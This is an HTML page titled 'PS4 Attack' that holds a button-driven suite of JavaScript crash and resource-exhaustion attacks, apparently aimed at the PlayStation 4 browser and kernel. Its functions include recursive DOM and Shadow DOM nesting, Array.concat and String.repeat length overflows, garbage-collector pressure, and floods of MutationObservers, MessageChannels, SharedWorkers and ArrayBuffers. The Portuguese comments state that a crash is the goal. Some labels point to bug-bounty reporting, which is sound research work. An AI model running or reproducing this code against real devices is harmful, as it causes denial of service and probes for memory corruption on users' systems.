<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
   <title>PS4 Attack</title>
   </head>
<body>

  <h1>ATTACK SUITE</h1>

    <button onclick="startDOMRecursion()">HACKERONE TRIGGER CRASH</button>
    <button onclick="runStringAttack()">HACKERONE STRING FLATTENING</button>
	
    <button class="kernel" onclick="runSharedWorkerFlood()">KERNEL PANIC: SharedWorker Process Flood</button>

    <button onclick="runArgumentsCrash()">ALTA REPORTAR Arguments JIT Optimization Crash</button>
    <button onclick="runConcatOOB()">ALTA REPORTAR Array.concat Spreadable Overflow</button>
    <button onclick="runConcatCrash()">ALTA REPORTAR Array.concat Heap Overflow</button>
    <button onclick="runSparseReverse()">ALTA REPORTAR Sparse Array Reverse (Memory Corruption)</button>
    <button onclick="runGCResurrection()">ALTA REPORTAR FinalizationRegistry UAF (GC Panic)</button>
    <button onclick="runImageDataOverflow()">ALTA REPORTAR ImageData Integer Overflow (Crash)</button>

    <button onclick="runReplaceBomb()">MEDIA REPORTAR String.replace Calculation Overflow</button>
    <button onclick="runBadArrayLength()">MEDIA REPORTAR Bad Array Length (Integer Overflow)</button>
    <button onclick="runStringOverflow()">MEDIA REPORTAR String.repeat Integer Overflow</button>	

    <button onclick="runMicrotaskBomb()">BAIXA REPORTAR Promise Microtask Starvation</button>
    <button onclick="run10_AllocPanic()">BAIXA REPORTAR Bad Array New Length</button>

    <button onclick="runBindChain()">STACK OVERFLOW Function.bind() Chain Reaction</button>
    <button onclick="runCollatorRecursion()">STACK OVERFLOW Intl.Collator Infinite Recursion</button>
	
    <button onclick="runLargeArrayOverflow()">SEM MEMORIA Large Array Buffer Overflow</button>
    <button onclick="runConcatCrash()">SEM MEMORIA Array.concat Heap Overflow</button>   
    <button onclick="runPathChaos()">SEM MEMORIA Path2D Recursive Geometry Crash</button> 
  
        
    <button onclick="runObserverFlood()">SEM MEMORIA MutationObserver Heap Overflow</button>   
    <button onclick="runSlotRecursion()">SEM MEMORIA Shadow DOM Slot Stack Smash</button>       
    <button class="kernel" onclick="runPipeFlood()">MEMORIA DIRETA IPC Pipe Memory Flood</button>
       
    <button class="kernel" onclick="runVMMaps()">MEMORIA DIRETA Kernel VM Map Exhaustion (Page Tables)</button>        
    <button onclick="runPadEndOverflow()">MEMORIA DIRETA String.padEnd Integer Overflow</button>
       
    

	
	
    <div id="log">Status: Aguardando testes...</div>
    <canvas id="c" width="100" height="100"></canvas>
    
    <div id="hidden-area" style="display:none;"></div>
    <div id="font-area" style="font-family: sans-serif;"></div>
    <canvas id="c_src" width="100" height="100" style="display:none;"></canvas>
    <canvas id="c_dst" width="100" height="100" style="display:none;"></canvas>
    <div id="sandbox" style="display:none;"></div>
    <div id="ax-root"></div>
    <div id="box" style="width:100px; height:100px; background:red; display:none;"></div>

    <script>
        function log(msg) {          
            let logElem = document.getElementById('log');
            logElem.innerText = `> ${msg}\n` + logElem.innerText;
        }
       
        // --- HACKERONE FUNCTIONS ---

        function startDOMRecursion() {
            log("Iniciando ataque de Profundidade DOM...");
            setTimeout(() => {
                try {
                    let root = document.createElement('div');
                    document.body.appendChild(root);
                    let count = 0;
                    
                    function dive() {
                        count++;
                        let child = document.createElement('div');
                        child.innerText = "."; 
                        root.appendChild(child);
                        root = child; 
                        
                        if (count % 1000 === 0) log(`Profundidade atual: ${count}`);
                        
                        dive(); 
                    }
                    dive();
                } catch (e) {
                    log("Erro capturado (Browser tentou proteger): " + e);
                    log("Tentando método alternativo (String Repeat)...");
                    document.body.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
                }
            }, 500);
        }

        function runStringAttack() {
            log("Fase 1: Criando Array Fragmentado...");
            setTimeout(() => {
                try {
                    var hugeArray = [];
                    var chunk = new Array(1024 * 1024).join("A"); 
                    
                    for(let i=0; i < 2000; i++) {
                        hugeArray.push(chunk);
                        if(i % 200 === 0) log("Alocado: " + i + "MB");
                    }

                    log("Fase 2: O ACHATAMENTO (The Flattening)...");
                    log("Atenção: O navegador deve travar agora.");

                    var flatString = hugeArray.join("");
                    log("Tamanho final: " + flatString.length);
                    var upper = flatString.toUpperCase(); 
                    
                } catch(e) {
                    log("Erro (Browser Protegeu): " + e.message);
                    log("Tentando Loop Infinito de Histórico como 'Plano B'...");
                    for(let i=0; i<100000; i++) {
                        history.pushState(0,0, i.toString());
                    }
                }
            }, 100);
        }

        // --- STACK OVERFLOW ---

        function runBindChain() {
            log("Criando cadeia Function.bind()...");
            try {
                let func = function() { return "pow"; };
                for (let i = 0; i < 50000; i++) {
                    func = func.bind(null);
                }
                log("Cadeia criada. Executando (Trigger)...");
                func();
                log("Bind Chain executada (Sem crash).");
            } catch(e) {
                log("Erro Bind: " + e.message);
                if (e.message.includes("stack")) {
                    log("SUCESSO: Stack Overflow via Bind Chain!");
                }
            }
        } 

        function runCollatorRecursion() {
            log("Iniciando Collator Recursion...");
            
            const collator = new Intl.Collator();
            
            const evil = {
                toString: function() {
                    // Recursão infinita dentro da chamada nativa
                    return this.toString(); 
                }
            };

            try {
                log("Comparando objeto recursivo...");
                // O C++ chama toString -> JS chama toString -> ...
                // Se o limite de pilha JS não for verificado dentro do callback do C++, BOOM.
                collator.compare(evil, "a");
                
            } catch(e) {
                log("Erro (Stack Overflow capturado): " + e.message);
            }
        }

        // --- FREEZE FUNCTIONS ---

        function runMicrotaskBomb() {
            log("Iniciando Microtask Starvation (IPC Freeze)...");
            log("Aviso: A aba vai congelar. Observe o comportamento do botão PS.");
            let count = 0;
            function loop() {
                count++;
                Promise.resolve().then(loop);
                if (count % 100000 === 0) {
                    new Date().toString(); 
                }
            }
            loop();
        }

        function runReplaceBomb() {
            log("Armando String.replace Logic Bomb...");
            try {
                let str = "test";
                const re = /.*/; 
                for(let i=0; i<30; i++) { 
                    str = str.replace(re, "$&".repeat(2)); 
                    if (i % 5 === 0) log(`Nível ${i}: Length ~${str.length}`);
                }
                log("String final gerada (Seguro).");
            } catch(e) {
                log("Erro Replace (Provável OOM): " + e.message);
            }
        }

        function runArgumentsCrash() {
            log("Testando Arguments Type Confusion...");
            
            function confuse(arg) {
                // O compilador tenta otimizar o acesso a 'arguments[0]'
                // Nós mudamos a estrutura de 'arguments' deletando índices
                delete arguments[0];
                
                // Agora definimos uma propriedade getter na cadeia de protótipos
                Object.defineProperty(Object.prototype, "0", {
                    get: () => {
                        log("Getter na prototype chain ativado!");
                        // Tenta invalidar a stack frame atual
                        return 0xDEADBEEF;
                    },
                    configurable: true
                });
                
                // O acesso deve ser lento agora, mas se o JIT usou Fast Path, vai ler lixo
                return arguments[0];
            }

            // Treina o motor com chamadas normais
            for(let i=0; i<1000; i++) confuse(1);
            
            log("Executando acesso confuso...");
            const val = confuse(1);
            
            if (val === 0xDEADBEEF) {
                log("Comportamento Correto (Lento).");
            } else if (val === undefined) {
                log("Indefinido (Seguro).");
            } else {
                log(`ALERTA: Valor inesperado lido! ${val} (Possível leitura de Stack lixo)`);
            }
            
            delete Object.prototype["0"]; // Limpeza
        }

        function runConcatOOB() {
            log("Iniciando Array.concat Type Confusion...");
            
            try {
                // Array alvo
                const target = [1.1];
                
                // Objeto malicioso que finge ser um array espalhável
                const proxy = new Proxy({}, {
                    get(target, prop) {
                        if (prop === Symbol.isConcatSpreadable) return true;
                        
                        if (prop === "length") {
                            log("Engine leu length. Retornando tamanho gigante...");
                            // Retorna um tamanho que pode causar overflow se somado ao target
                            // Em 32-bit: 0xFFFFFFFF
                            return 4294967295; 
                        }
                        
                        if (prop === "0") {
                            log("Engine leu índice 0.");
                            return 0x41414141;
                        }
                        
                        return undefined;
                    },
                    has(target, prop) { return true; } // Finge ter todas as propriedades
                });

                log("Executando concat()...");
                
                // O 'concat' tenta alocar um novo array com tamanho = target.length + proxy.length
                // Se houver Integer Overflow, ele aloca pouco.
                // Depois tenta copiar os itens. Se não verificar limites, escreve fora.
                const res = target.concat(proxy);
                
                log("Concat terminou (Sem Crash). Length: " + res.length);
                
            } catch(e) {
                // "Out of memory" ou "Invalid array length" são bons sinais.
                // Crash é o objetivo.
                log("Erro Concat: " + e.message);
            }
        } 

        function runConcatCrash() {
            log("Iniciando Array.concat Overflow...");
            
            try {
                const target = [];
                // Objeto malicioso que diz ser um array gigante
                const evil = {
                    [Symbol.isConcatSpreadable]: true,
                    // Tamanho crítico: 2^32 - 1. Se somado a algo, pode virar 0 (Overflow)
                    length: 0xFFFFFFFF, 
                    0: 1, 
                    1: 2
                };

                log("Concatenando array virtualmente gigante...");
                
                // Se o motor calcular (0 + 0xFFFFFFFF) e alocar, pode falhar.
                // Se ele tentar copiar os elementos, pode escrever fora do buffer.
                const res = target.concat(evil);
                
                log("Concat sobreviveu. Length: " + res.length);
                
            } catch(e) {
                // Erro de memória (OOM) é um bom sinal. Crash é o objetivo.
                log("Resultado: " + e.message);
            }
        }

        function runSparseReverse() {
            log("Iniciando Sparse Array Reverse...");
            
            try {
                const arr = [];
                // Define índices nos extremos do limite de 32-bit
                arr[0] = 1;
                arr[0xFFFFFFFE] = 2; // 4GB - 2
                
                log(`Array esparso criado. Length: ${arr.length}`);
                log("Executando reverse()...");
                
                // O GOLPE: O motor tem de trocar o índice 0 com o 0xFFFFFFFE.
                // Se ele tentar iterar ou alocar memória para os buracos, OOM.
                // Se ele calcular errado o endereço do último item, Crash.
                arr.reverse();
                
                log("Reverse concluído.");
                log("Valor em [0]: " + arr[0]); // Deve ser 2
                
            } catch(e) {
                log("Erro Sparse: " + e.message);
            }
        }

        function runGCResurrection() {
            log("Iniciando GC Resurrection Attack...");
            
            if (!window.FinalizationRegistry) {
                log("API FinalizationRegistry não suportada.");
                return;
            }

            let registry = new FinalizationRegistry(heldValue => {
                // Este código roda quando o objeto morre.
                // O GC está num estado sensível aqui.
                log("Objeto coletado! Tentando alocação massiva no callback...");
                
                // Tenta forçar movimento de memória enquanto o GC limpa
                const chaos = [];
                try {
                    for(let i=0; i<1000; i++) chaos.push(new ArrayBuffer(1024 * 100));
                } catch(e) {}
                
                // Se o GC não estiver bloqueado corretamente, isso pode corromper o heap.
            });

            // Cria objetos descartáveis
            function makeTrash() {
                let obj = { id: Math.random() };
                registry.register(obj, "LIXO");
                obj = null; // Marca para coleta
            }

            // Gera lixo massivo para forçar o ciclo de GC
            log("Gerando pressão de GC...");
            const interval = setInterval(() => {
                for(let i=0; i<1000; i++) makeTrash();
                
                // Tenta forçar alocação para disparar o GC
                const trigger = new Array(10000).fill(1.1);
            }, 10);

            setTimeout(() => {
                clearInterval(interval);
                log("Teste GC finalizado.");
            }, 5000);
        }

        // --- SEM MEMORIA FUNCTIONS ---

	    function runBadArrayLength() {
            log("Testando Array Length Integer Overflow...");
            const sizes = [
                0xFFFFFFFF, 0x80000000, 0x7FFFFFFF, -1, 4294967295, 4294967296 
            ];
            sizes.forEach(size => {
                try {
                    log(`Tentando alocar Uint8Array(${size})...`);
                    let arr = new Uint8Array(size);
                    log("Alocado (Inesperado!)");
                } catch(e) {}
            });
            log("Teste de Array finalizado.");
        }

        function run10_AllocPanic() {
            log("[10] Testing Allocator Panic...");
            try {
                const arr = new ArrayBuffer(2147483647); // Max 32-bit signed
                log("Allocated (Unexpected).");
            } catch(e) { log("Alloc Error (Expected): " + e.message); }
        }

        function runImageDataOverflow() {
            log("Iniciando ImageData Math Attack...");
            
            try {
                // Valores críticos para 32-bit (0xFFFFFFFF)
                // 1073741824 * 4 = 0 (Overflow exato)
                // Vamos tentar valores próximos para enganar a validação
                const targets = [
                    { w: 1073741824, h: 1 }, // 4GB exato
                    { w: 32768, h: 32768 },  // 1GB pixels -> 4GB bytes
                    { w: 65536, h: 65536 },  // 4GB pixels -> 16GB bytes (Overflow certo se não checado)
                    { w: 23170, h: 23170 }   // ~2GB bytes
                ];

                targets.forEach((t, i) => {
                    try {
                        log(`Tentativa ${i}: ${t.w} x ${t.h}...`);
                        // O construtor pode lançar IndexSizeError (Seguro)
                        // Se passar e o cálculo estiver errado -> Heap Corruption
                        const img = new ImageData(t.w, t.h);
                        log("ALERTA: ImageData criado! Verifique estabilidade.");
                        
                        // Tenta acessar o buffer (pode crashar se o tamanho for falso)
                        const len = img.data.length;
                        log("Buffer Length reportado: " + len);
                        
                    } catch(e) {
                        // Erro esperado se a proteção funcionar
                    }
                });
                
                log("Teste ImageData finalizado.");

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        function runStringOverflow() {
            log("Iniciando String.repeat Overflow...");
            
            try {
                // 1. Tenta o limite de 32-bit (4GB)
                // Se o sistema usar 32-bit para comprimento, isso vira 0 ou negativo.
                // "A" (1 byte) * (2^32 - 1)
                // Se o alocador calcular errado, aloca pouco e escreve muito.
                
                // Valores críticos:
                // 0xFFFFFFFF (Max Uint32)
                // 0x7FFFFFFF (Max Int32)
                // 0x20000000 (512MB - limite comum de string no V8/JSC antigo)
                
                const counts = [0x7FFFFFFF, 0xFFFFFFF0, 268435455]; 
                
                counts.forEach(c => {
                    try {
                        log(`Tentando repetir string ${c} vezes...`);
                        const s = "A".repeat(c);
                        log(`String criada (Seguro). Length: ${s.length}`);
                    } catch(e) {
                        // RangeError (Invalid string length) é a proteção.
                        // Se crashar, a proteção falhou.
                        log("Erro (Browser Protegeu): " + e.message);
                    }
                });

                // Tentativa secundária: Overflow com string base maior
                // "AAAA" (4 bytes) * 0x40000000 = 4GB
                const base = "AAAA";
                log("Tentando overflow com base maior...");
                const s2 = base.repeat(0x3FFFFFFF); 
                log("Seguro.");

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }
		
        function runLargeArrayOverflow() {
            log("Iniciando Allocation Overflow...");
            
            // Valores perigosos para o alocador (que podem virar 0 ou negativo)
            const sizes = [
                0xFFFFFFFF, // Max Uint32
                0x80000000, // Max Int32 + 1
                2147483648, 
                4294967296
            ];

            sizes.forEach(size => {
                try {
                    log(`Tentando alocar: ${size} bytes...`);
                    
                    // Se o motor não validar, e tentar alocar size_t(size),
                    // pode ocorrer wrap-around ou falha catastrófica.
                    const arr = new Uint8Array(size);
                    
                    // Se chegou aqui, algo muito estranho aconteceu.
                    log("ALERTA: Alocação de " + size + " permitida! (Tamanho real: " + arr.length + ")");
                    
                    // Tenta escrever no final para ver se a memória existe
                    arr[size - 1] = 0x41;
                    
                } catch(e) {
                    // Erro esperado (RangeError).
                    // Se crashar (tela azul), é Sucesso.
                }
            });
            log("Teste de Alocação finalizado.");
	}

        function runPathChaos() {
            log("Iniciando Path2D Chaos...");
            
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            
            try {
                const path = new Path2D();
                
                // 1. Injeta valores tóxicos (NaN/Infinity) na geometria
                // Isso tenta quebrar o cálculo de 'Tessellation' (divisão em triângulos)
                log("Injetando coordenadas tóxicas...");
                path.moveTo(0, 0);
                path.lineTo(100, 100);
                path.lineTo(NaN, Infinity); // Veneno
                path.lineTo(1000000, 1000000); // Coordenada gigante
                
                // 2. Recursão de Caminho
                // Adiciona o caminho a si mesmo várias vezes
                log("Criando recursão de caminhos...");
                for(let i=0; i<1000; i++) {
                    path.addPath(path, {e: 1, f: 1}); // Matriz de transformação acumulativa
                }
                
                // 3. O GOLPE: Força o rasterizador a processar isso
                log("Rasterizando (Fill)...");
                ctx.fill(path);
                
                log("Path2D sobreviveu.");
                
            } catch(e) {
                log("Erro Path: " + e.message);
            }
        }

        // --- TESTE 3: MutationObserver Heap Overflow ---
        function runObserverFlood() {
            log("[WebKit] Iniciando Observer Flood...");
            const sandbox = document.getElementById('sandbox');
            
            // Cria um observador que reage a mudanças criando MAIS mudanças
            const observer = new MutationObserver((mutations) => {
                // Para cada mutação, cria 2 novas
                const div = document.createElement('div');
                sandbox.appendChild(div);
                div.setAttribute('a', 'b');
            });
            
            observer.observe(sandbox, { childList: true, attributes: true, subtree: true });
            
            // Gatilho inicial
            log("Detonando bomba de mutação...");
            sandbox.appendChild(document.createElement('span'));
            
            // Aviso: Isso vai congelar a aba até o OOM ou Crash
            setTimeout(() => {
                observer.disconnect();
                log("Observer desconectado (se o browser responder).");
            }, 5000);
        }

        // --- TESTE 2: Shadow DOM Slot Recursion ---
        function runSlotRecursion() {
            log("[WebKit] Criando Shadow DOM Recursion...");
            const host = document.createElement('div');
            document.body.appendChild(host);
            const root = host.attachShadow({mode: 'open'});
            
            // Cria cadeia de slots: Slot1 -> Slot2 -> Slot3 ...
            const depth = 5000;
            let current = root;
            
            try {
                for(let i=0; i<depth; i++) {
                    const slot = document.createElement('slot');
                    // Cria um div para envolver e aumentar a complexidade da árvore de renderização
                    const div = document.createElement('div');
                    div.appendChild(slot);
                    current.appendChild(div);
                    current = slot; // Próximo nível dentro do slot anterior
                }
                
                // Injeta conteúdo no host para ser projetado através dos 5000 slots
                const content = document.createElement('div');
                content.innerText = "CRASH";
                host.appendChild(content);
                
                log("Árvore de Slots criada. Forçando Layout...");
                // Força cálculo
                const h = host.offsetHeight;
                
                log("Layout Engine sobreviveu.");
                document.body.removeChild(host);
                
            } catch(e) {
                log("Erro Slot: " + e.message);
            }
        }

        // --- TESTE 4: IPC Pipe Memory Flood (Kernel) ---
        function runPipeFlood() {
            log("[KERNEL] Iniciando IPC Pipe Flood...");
            
            const channels = [];
            // Buffer de mensagem (Payload)
            const data = new ArrayBuffer(1024 * 64); // 64KB
            
            const interval = setInterval(() => {
                // Cria 100 canais por ciclo
                for(let i=0; i<100; i++) {
                    const mc = new MessageChannel();
                    // Envia dados para a porta 2, mas NINGUÉM lê a porta 2.
                    // O Kernel é obrigado a guardar isso no buffer do pipe.
                    mc.port1.postMessage(data);
                    channels.push(mc); // Mantém vivo
                }
                
                if (channels.length % 1000 === 0) log(`Canais ativos: ${channels.length}`);
                
                if (channels.length > 50000) {
                    clearInterval(interval);
                    log("Flood pausado. Verifique instabilidade do sistema.");
                }
            }, 10);
        }

        // --- TESTE 4: Kernel VM Map Exhaustion (Kernel) ---
        // Tenta esgotar as entradas de mapa de memória do processo.
        function runVMMaps() {
            log("[KERNEL] Iniciando VM Map Exhaustion...");
            log("Criando 500.000 ArrayBuffers independentes...");
            
            const buffers = [];
            // O Kernel do FreeBSD tem limites como 'vm.max_map_entries'
            const limit = 500000;
            
            const interval = setInterval(() => {
                try {
                    // Cria 5000 buffers por ciclo
                    // Cada um requer uma entrada de mapa separada se não for GC'd
                    for(let i=0; i<5000; i++) {
                        // Buffer pequeno (4KB = 1 página)
                        buffers.push(new ArrayBuffer(4096));
                    }
                    
                    log(`Buffers alocados: ${buffers.length}`);
                    
                    if (buffers.length >= limit) {
                        clearInterval(interval);
                        log("Limite atingido. Verifique instabilidade.");
                    }
                } catch(e) {
                    log("Erro de Alocação (Sucesso parcial): " + e.message);
                    clearInterval(interval);
                }
            }, 50);
        }

        // --- TESTE 4: SharedWorker Process Flood (Kernel) ---
        // Spama criação de SharedWorkers.
        function runSharedWorkerFlood() {
            log("[KERNEL] Iniciando SharedWorker Flood...");
            
            if (!window.SharedWorker) {
                log("SharedWorker não suportado.");
                return;
            }
            
            const workers = [];
            let count = 0;
            
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) {
                    try {
                        // Nomes únicos criam novas instâncias/processos
                        const sw = new SharedWorker("data:text/javascript,onconnect=function(e){}", "worker_" + count);
                        workers.push(sw);
                        count++;
                    } catch(e) {
                        clearInterval(interval);
                        log("Limite atingido: " + e.message);
                        return;
                    }
                }
                
                if (count % 100 === 0) log(`SharedWorkers: ${count}`);
                
                if (count > 5000) {
                    clearInterval(interval);
                    log("Teste pausado.");
                }
            }, 10);
        }

        // --- TESTE 2: String.padEnd Integer Overflow ---
        function runPadEndOverflow() {
            log("[WebKit] Testando padEnd Overflow...");
            const base = "A";
            
            // Valores próximos do limite de 32-bit (2^31 - 1)
            const targets = [0x7FFFFFFF, 0x40000000, 1073741824]; 
            
            targets.forEach(len => {
                setTimeout(() => {
                    try {
                        log(`Tentando padEnd(${len})...`);
                        // Se houver overflow no cálculo (len * sizeof(char)), aloca pouco e escreve muito.
                        const s = base.padEnd(len, "B");
                        log(`String criada (Length: ${s.length})`);
                    } catch(e) {
                        // RangeError é normal. Crash é sucesso.
                    }
                }, 100);
            });
        }

    </script>
</body>
</html>
